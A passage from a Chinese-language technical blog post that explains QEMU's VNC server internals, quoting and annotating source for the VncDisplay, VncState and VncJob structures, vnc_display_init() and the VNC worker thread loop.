<code>vnc_init_func()</code> 来完成的</p><p>当我们只有一个 VGA 设备输出时，其输出会被同时更新给多个 VNC Client，此时多个 VNC Client 所获取到的画面是相同的</p><p><code>vnc_init_func()</code> 定义于 <code>ui/vnc.c</code> 中，比较简短，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vnc_init_func</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, QemuOpts *opts, Error **errp)</span><br>&#123;<br>    Error *local_err = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">char</span> *id = (<span class="hljs-type">char</span> *)qemu_opts_id(opts);<br><br>    assert(id);<br>    vnc_display_init(id, &amp;local_err);<br>    <span class="hljs-keyword">if</span> (local_err) &#123;<br>        error_propagate(errp, local_err);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    vnc_display_open(id, &amp;local_err);<br>    <span class="hljs-keyword">if</span> (local_err != <span class="hljs-literal">NULL</span>) &#123;<br>        error_propagate(errp, local_err);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要做了两件事：</p><ul><li><code>vnc_display_init()</code>：初始化一个 <code>VncDisplay</code> 实例</li><li><code>vnc_display_open()</code>：启动一个 VNC Server</li></ul><p><code>vnc_display_open()</code> 主要就是单纯的创建一个普通的 server，以及一些和 VNC 协议具体细节相关的部分，故我们接下来主要分析 <code>vnc_display_init()</code></p><h2 id="〇、VNC-相关结构体"><a href="#〇、VNC-相关结构体" class="headerlink" title="〇、VNC 相关结构体"></a>〇、VNC 相关结构体</h2><h3 id="I、VncDisplay-单个-VNC-Server-实例"><a href="#I、VncDisplay-单个-VNC-Server-实例" class="headerlink" title="I、VncDisplay - 单个 VNC Server 实例"></a>I、VncDisplay - 单个 VNC Server 实例</h3><p>该结构体定义于 <code>ui/vnc.h</code> 中，表示单个 VNC Server 实例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncDisplay</span></span><br><span class="hljs-class">&#123;</span><br>    QTAILQ_HEAD(, VncState) clients;<br>    <span class="hljs-type">int</span> num_connecting;<br>    <span class="hljs-type">int</span> num_shared;<br>    <span class="hljs-type">int</span> num_exclusive;<br>    <span class="hljs-type">int</span> connections_limit;<br>    VncSharePolicy share_policy;<br>    QIONetListener *listener;<br>    QIONetListener *wslistener;<br>    DisplaySurface *ds;<br>    DisplayChangeListener dcl;<br>    <span class="hljs-type">kbd_layout_t</span> *kbd_layout;<br>    <span class="hljs-type">int</span> lock_key_sync;<br>    QEMUPutLEDEntry *led;<br>    <span class="hljs-type">int</span> ledstate;<br>    QKbdState *kbd;<br>    QemuMutex mutex;<br><br>    QEMUCursor *cursor;<br>    <span class="hljs-type">int</span> cursor_msize;<br>    <span class="hljs-type">uint8_t</span> *cursor_mask;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncSurface</span> <span class="hljs-title">guest</span>;</span>   <span class="hljs-comment">/* guest visible surface (aka ds-&gt;surface) */</span><br>    <span class="hljs-type">pixman_image_t</span> *server;    <span class="hljs-comment">/* vnc server surface */</span><br>    <span class="hljs-type">int</span> true_width; <span class="hljs-comment">/* server surface width before rounding up */</span><br><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *id;<br>    QTAILQ_ENTRY(VncDisplay) next;<br>    <span class="hljs-type">bool</span> is_unix;<br>    <span class="hljs-type">char</span> *password;<br>    <span class="hljs-type">time_t</span> expires;<br>    <span class="hljs-type">int</span> auth;<br>    <span class="hljs-type">int</span> subauth; <span class="hljs-comment">/* Used by VeNCrypt */</span><br>    <span class="hljs-type">int</span> ws_auth; <span class="hljs-comment">/* Used by websockets */</span><br>    <span class="hljs-type">int</span> ws_subauth; <span class="hljs-comment">/* Used by websockets */</span><br>    <span class="hljs-type">bool</span> lossy;<br>    <span class="hljs-type">bool</span> non_adaptive;<br>    <span class="hljs-type">bool</span> power_control;<br>    QCryptoTLSCreds *tlscreds;<br>    QAuthZ *tlsauthz;<br>    <span class="hljs-type">char</span> *tlsauthzid;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC_SASL</span><br>    VncDisplaySASL sasl;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    AudioState *audio_state;<br>&#125;;<br></code></pre></td></tr></table></figure><p>我们主要关注这几个成员变量：</p><ul><li><code>clients</code>：连接到该服务器上的所有客户端，每个客户端为一个 <code>VncClient</code> 实例，多个 <code>VncClient</code> 实例间形成一个链表</li><li><code>ds</code>：</li><li><code>dcl</code>：该 VNC Server 所监听的 QemuConsole 的监听器，当对应的 QemuConsole 发生更改时便会调用 <code>dcl-&gt;ops</code> 中对应函数指针</li><li><code>next</code>：多个 VncDisplay 之间互相连接形成一个链表</li></ul><p>同时存在着一个全局变量 <code>vnc_displays</code>，Qemu 中所有的 VncDisplay 都挂载在该链表上：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-title function_">QTAILQ_HEAD</span><span class="hljs-params">(, VncDisplay)</span> vnc_displays =<br>    QTAILQ_HEAD_INITIALIZER(vnc_displays);<br></code></pre></td></tr></table></figure><h3 id="II、VncState-单个-VNC-连接（VNC-Client）"><a href="#II、VncState-单个-VNC-连接（VNC-Client）" class="headerlink" title="II、VncState - 单个 VNC 连接（VNC Client）"></a>II、VncState - 单个 VNC 连接（VNC Client）</h3><p>该结构体定义于 <code>ui/vnc.h</code> 中，表示连接到特定 VNC Server 上的单个 VNC Client 实例，其中包含客户端的各种信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncState</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> magic;<br>    QIOChannelSocket *sioc; <span class="hljs-comment">/* The underlying socket */</span><br>    QIOChannel *ioc; <span class="hljs-comment">/* The channel currently used for I/O */</span><br>    guint ioc_tag;<br>    gboolean disconnecting;<br><br>    DECLARE_BITMAP(dirty[VNC_MAX_HEIGHT], VNC_DIRTY_BITS);<br>    <span class="hljs-type">uint8_t</span> **lossy_rect; <span class="hljs-comment">/* Not an Array to avoid costly memcpy in</span><br><span class="hljs-comment">                           * vnc-jobs-async.c */</span><br><br>    VncDisplay *vd;<br>    VncStateUpdate update; <span class="hljs-comment">/* Most recent pending request from client */</span><br>    VncStateUpdate job_update; <span class="hljs-comment">/* Currently processed by job thread */</span><br>    <span class="hljs-type">int</span> has_dirty;<br>    <span class="hljs-type">uint32_t</span> features;<br>    <span class="hljs-type">int</span> absolute;<br>    <span class="hljs-type">int</span> last_x;<br>    <span class="hljs-type">int</span> last_y;<br>    <span class="hljs-type">uint32_t</span> last_bmask;<br>    <span class="hljs-type">size_t</span> client_width; <span class="hljs-comment">/* limited to u16 by RFB proto */</span><br>    <span class="hljs-type">size_t</span> client_height; <span class="hljs-comment">/* limited to u16 by RFB proto */</span><br>    VncShareMode share_mode;<br><br>    <span class="hljs-type">uint32_t</span> vnc_encoding;<br><br>    <span class="hljs-type">int</span> major;<br>    <span class="hljs-type">int</span> minor;<br><br>    <span class="hljs-type">int</span> auth;<br>    <span class="hljs-type">int</span> subauth; <span class="hljs-comment">/* Used by VeNCrypt */</span><br>    <span class="hljs-type">char</span> challenge[VNC_AUTH_CHALLENGE_SIZE];<br>    QCryptoTLSSession *tls; <span class="hljs-comment">/* Borrowed pointer from channel, don&#x27;t free */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC_SASL</span><br>    VncStateSASL sasl;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">bool</span> encode_ws;<br>    <span class="hljs-type">bool</span> websocket;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC</span><br>    VncClientInfo *info;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">/* Job thread bottom half has put data for a forced update</span><br><span class="hljs-comment">     * into the output buffer. This offset points to the end of</span><br><span class="hljs-comment">     * the update data in the output buffer. This lets us determine</span><br><span class="hljs-comment">     * when a force update is fully sent to the client, allowing</span><br><span class="hljs-comment">     * us to process further forced updates. */</span><br>    <span class="hljs-type">size_t</span> force_update_offset;<br>    <span class="hljs-comment">/* We allow multiple incremental updates or audio capture</span><br><span class="hljs-comment">     * samples to be queued in output buffer, provided the</span><br><span class="hljs-comment">     * buffer size doesn&#x27;t exceed this threshold. The value</span><br><span class="hljs-comment">     * is calculating dynamically based on framebuffer size</span><br><span class="hljs-comment">     * and audio sample settings in vnc_update_throttle_offset() */</span><br>    <span class="hljs-type">size_t</span> throttle_output_offset;<br>    Buffer output;<br>    Buffer input;<br>    <span class="hljs-comment">/* current output mode information */</span><br>    VncWritePixels *write_pixels;<br>    PixelFormat client_pf;<br>    <span class="hljs-type">pixman_format_code_t</span> client_format;<br>    <span class="hljs-type">bool</span> client_be;<br><br>    CaptureVoiceOut *audio_cap;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">audsettings</span> <span class="hljs-title">as</span>;</span><br><br>    VncReadEvent *read_handler;<br>    <span class="hljs-type">size_t</span> read_handler_expect;<br><br>    <span class="hljs-type">bool</span> <span class="hljs-built_in">abort</span>;<br>    QemuMutex output_mutex;<br>    QEMUBH *bh;<br>    Buffer jobs_buffer;<br><br>    <span class="hljs-comment">/* Encoding specific, if you add something here, don&#x27;t forget to</span><br><span class="hljs-comment">     *  update vnc_async_encoding_start()</span><br><span class="hljs-comment">     */</span><br>    VncTight *tight;<br>    VncZlib zlib;<br>    VncHextile hextile;<br>    VncZrle *zrle;<br>    VncZywrle zywrle;<br><br>    Notifier mouse_mode_notifier;<br><br>    QemuClipboardPeer cbpeer;<br>    QemuClipboardInfo *cbinfo;<br>    <span class="hljs-type">uint32_t</span> cbpending;<br><br>    QTAILQ_ENTRY(VncState) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在同一个 VncDisplay （VNC Server）下的所有 VncState（VNC Client）连接成一个链表</p><h3 id="III、VncJob-单个-VNC-连接单次需要更新的图像信息"><a href="#III、VncJob-单个-VNC-连接单次需要更新的图像信息" class="headerlink" title="III、VncJob - 单个 VNC 连接单次需要更新的图像信息"></a>III、VncJob - 单个 VNC 连接单次需要更新的图像信息</h3><p>VncJob 结构体用来表示单个 VNC 连接（VncState）单次需要更新的图像信息，定义于 <code>ui/vnc.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncJob</span></span><br><span class="hljs-class">&#123;</span><br>    VncState *vs;<br><br>    QLIST_HEAD(, VncRectEntry) rectangles;<br>    QTAILQ_ENTRY(VncJob) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在单次的图像更新当中，单个矩形区域具体的的更新信息使用 <code>VncRectEntry</code> 结构体表示，单个 VncJob 中可以有多个 VncRectEntry，他们之间形成一个单向链表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncRect</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> y;<br>    <span class="hljs-type">int</span> w;<br>    <span class="hljs-type">int</span> h;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncRectEntry</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncRect</span> <span class="hljs-title">rect</span>;</span><br>    QLIST_ENTRY(VncRectEntry) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>多个 VncJob 之间也构成一个单向链表，最终挂载到一个 <code>VncJobQueue</code> 结构体上，该结构体定义于 <code>ui/vnc-jobs.c</code> 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncJobQueue</span> &#123;</span><br>    QemuCond cond;<br>    QemuMutex mutex;<br>    QemuThread thread;<br>    <span class="hljs-type">bool</span> <span class="hljs-built_in">exit</span>;<br>    QTAILQ_HEAD(, VncJob) jobs;<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncJobQueue</span> <span class="hljs-title">VncJobQueue</span>;</span><br></code></pre></td></tr></table></figure><p>同时我们存在着一个全局的 VncJobQueue，默认情况下我们会将 VncJob 挂载到上面，同时 vnc worker thread（负责将图像信息发送给 client 的线程）也是主要依赖于这个全局的 queue</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We use a single global queue, but most of the functions are</span><br><span class="hljs-comment"> * already reentrant, so we can easily add more than one encoding thread</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> VncJobQueue *<span class="hljs-built_in">queue</span>;<br></code></pre></td></tr></table></figure><h2 id="一、vnc-display-init"><a href="#一、vnc-display-init" class="headerlink" title="一、vnc_display_init()"></a>一、vnc_display_init()</h2><p>该函数主要作用便是初始化一个 <code>VncDisplay</code> 结构体，定义于 <code>ui/vnc.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">vnc_display_init</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *id, Error **errp)</span><br>&#123;<br>    VncDisplay *vd;<br><br>    <span class="hljs-keyword">if</span> (vnc_display_find(id) != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    vd = g_malloc0(<span class="hljs-keyword">sizeof</span>(*vd));<br><br>    vd-&gt;id = strdup(id);<br>    QTAILQ_INSERT_TAIL(&amp;vnc_displays, vd, next);  <span class="hljs-comment">// 加入到全局链表中</span><br><br>    QTAILQ_INIT(&amp;vd-&gt;clients);<br>    vd-&gt;expires = TIME_MAX;<br><br>    <span class="hljs-keyword">if</span> (keyboard_layout) &#123;  <span class="hljs-comment">// 初始化键盘布局</span><br>        trace_vnc_key_map_init(keyboard_layout);<br>        vd-&gt;kbd_layout = init_keyboard_layout(name2keysym,<br>                                              keyboard_layout, errp);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        vd-&gt;kbd_layout = init_keyboard_layout(name2keysym, <span class="hljs-string">&quot;en-us&quot;</span>, errp);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!vd-&gt;kbd_layout) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    vd-&gt;share_policy = VNC_SHARE_POLICY_ALLOW_EXCLUSIVE;<br>    vd-&gt;connections_limit = <span class="hljs-number">32</span>;<br><br>    qemu_mutex_init(&amp;vd-&gt;mutex);<br>    vnc_start_worker_thread();  <span class="hljs-comment">// 启动 VNC 的 worker 线程</span><br><br>    vd-&gt;dcl.ops = &amp;dcl_ops; <span class="hljs-comment">// 设置 DisplayChangeListener 的 ops</span><br>    register_displaychangelistener(&amp;vd-&gt;dcl);<br>    vd-&gt;kbd = qkbd_state_init(vd-&gt;dcl.con);<br>&#125;<br></code></pre></td></tr></table></figure><p>大致流程如下：</p><ul><li>创建一个 VncDisplay，加入到全局链表中</li><li>初始化键盘布局</li><li>启动 VNC worker thread（若未启动），由 worker thread 将图像信息发送给 client</li><li>设置该 VncDisplay 对应的 DisplayChangeListener 的 ops 为 <code>dcl_ops</code></li><li>调用 <code>register_displaychangelistener()</code> 注册该 VncDisplay 对应的 DisplayChangeListener</li></ul><h3 id="I、VNC-worker-thread-将图像更新发送给客户端"><a href="#I、VNC-worker-thread-将图像更新发送给客户端" class="headerlink" title="I、VNC worker thread - 将图像更新发送给客户端"></a>I、VNC worker thread - 将图像更新发送给客户端</h3><p><code>vnc worker thread</code> 是 Qemu 中 VNC 服务中的一个重要的线程，其用以持续地处理挂载在全局的 VncJobQueue 上的 VncJob，并将图像更新数据发送给 vnc 客户端</p><p>在 <code>vnc_display_init()</code> 中创建 VncDisplay 实例时，其还会调用 <code>vnc_start_worker_thread()</code> 启动 vnc worker thread：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">vnc_worker_thread_running</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">queue</span>; <span class="hljs-comment">/* Check global queue */</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vnc_start_worker_thread</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    VncJobQueue *q;<br><br>    <span class="hljs-keyword">if</span> (vnc_worker_thread_running())<br>        <span class="hljs-keyword">return</span> ;<br><br>    q = vnc_queue_init();<br>    qemu_thread_create(&amp;q-&gt;thread, <span class="hljs-string">&quot;vnc_worker&quot;</span>, vnc_worker_thread, q,<br>                       QEMU_THREAD_DETACHED);<br>    <span class="hljs-built_in">queue</span> = q; <span class="hljs-comment">/* Set global queue */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>该线程的本体便是 <code>vnc_worker_thread</code> 函数，主要就是一个重复调用 <code>vnc_worker_thread_loop</code> 的大循环：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">vnc_worker_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    VncJobQueue *<span class="hljs-built_in">queue</span> = arg;<br><br>    qemu_thread_get_self(&amp;<span class="hljs-built_in">queue</span>-&gt;thread);<br><br>    <span class="hljs-keyword">while</span> (!vnc_worker_thread_loop(<span class="hljs-built_in">queue</span>)) ;<br>    vnc_queue_clear(<span class="hljs-built_in">queue</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>vnc_worker_thread_loop</code> 定义如下，该函数会一直等待到全局的 VncJobQueue 的 VncJob 链表非空，单次调用处理一个 VncJob：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vnc_worker_thread_loop</span><span class="hljs-params">(VncJobQueue *<span class="hljs-built_in">queue</span>)</span><br>&#123;<br>    VncJob *job;<br>    VncRectEntry *entry, *tmp;<br>    VncState vs = &#123;&#125;;<br>    <span class="hljs-type">int</span> n_rectangles;<br>    <span class="hljs-type">int</span> saved_offset;<br><br>    vnc_lock_queue(<span class="hljs-built_in">queue</span>);  <span class="hljs-comment">// 等待全局 queue 不为空</span><br>    <span class="hljs-keyword">while</span> (QTAILQ_EMPTY(&amp;<span class="hljs-built_in">queue</span>-&gt;jobs) &amp;&amp; !<span class="hljs-built_in">queue</span>-&gt;<span class="hljs-built_in">exit</span>) &#123;<br>        qemu_cond_wait(&amp;<span class="hljs-built_in">queue</span>-&gt;cond, &amp;<span class="hljs-built_in">queue</span>-&gt;mutex);<br>    &#125;<br>    <span class="hljs-comment">/* Here job can only be NULL if queue-&gt;exit is true */</span><br>    job = QTAILQ_FIRST(&amp;<span class="hljs-built_in">queue</span>-&gt;jobs);  <span class="hljs-comment">// 取下第一个 job</span><br>    vnc_unlock_queue(<span class="hljs-built_in">queue</span>);<br>    assert(job-&gt;vs-&gt;magic == VNC_MAGIC);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">queue</span>-&gt;<span class="hljs-built_in">exit</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    vnc_lock_output(job-&gt;vs);  <span class="hljs-comment">// 锁上 VncState</span><br>    <span class="hljs-keyword">if</span> (job-&gt;vs-&gt;ioc == <span class="hljs-literal">NULL</span> || job-&gt;vs-&gt;<span class="hljs-built_in">abort</span> == <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-comment">// io channel 为空或 abort 为真，断开连接</span><br>        vnc_unlock_output(job-&gt;vs);<br>        <span class="hljs-keyword">goto</span> disconnected;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (buffer_empty(&amp;job-&gt;vs-&gt;output)) &#123;<br>        <span class="hljs-comment">// 这里的 output 为 Buffer 类型，类似于 iovec，包含着长度与一个指向 buffer 的指针</span><br>        <span class="hljs-comment">// buffer_move_empty(*to, *from) 的作用就是释放 to 的 buffer，将 from 的 buffer 给到 to 的 buffer</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Looks like a NOP as it obviously moves no data.  But it</span><br><span class="hljs-comment">         * moves the empty buffer, so we don&#x27;t have to malloc a new</span><br><span class="hljs-comment">         * one for vs.output</span><br><span class="hljs-comment">         */</span><br>        buffer_move_empty(&amp;vs.output, &amp;job-&gt;vs-&gt;output);<br>    &#125;<br>    vnc_unlock_output(job-&gt;vs);<br><br>    